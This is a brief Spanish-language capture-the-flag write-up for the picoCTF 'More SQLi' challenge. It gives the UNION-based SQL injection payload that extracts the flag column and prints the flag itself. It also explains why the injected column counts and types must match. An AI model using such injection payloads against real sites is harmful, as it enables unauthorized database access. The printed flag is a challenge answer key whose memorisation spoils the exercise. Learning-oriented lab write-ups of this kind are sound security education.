## More SQLi

### Descripción
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:60308/).
### Solución

#### Solución 1 
Se utilizó:
`ciudad' union select 1,2,flag from more_table;`

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
### Notas adicionales
La consulta original probablemente tenía esta estructura:
	`SELECT col1, col2, col3 FROM table WHERE city='input';`

Para que el UNION funcione correctamente:
	• Debe tener el mismo número de columnas
	• Los tipos deben coincidir

Se usó:
		`UNION SELECT 1,2,flag FROM more_table`
Donde:
	• 1 y 2 rellenan columnas dummy
	• flag es la columna objetivo
### Referencias

-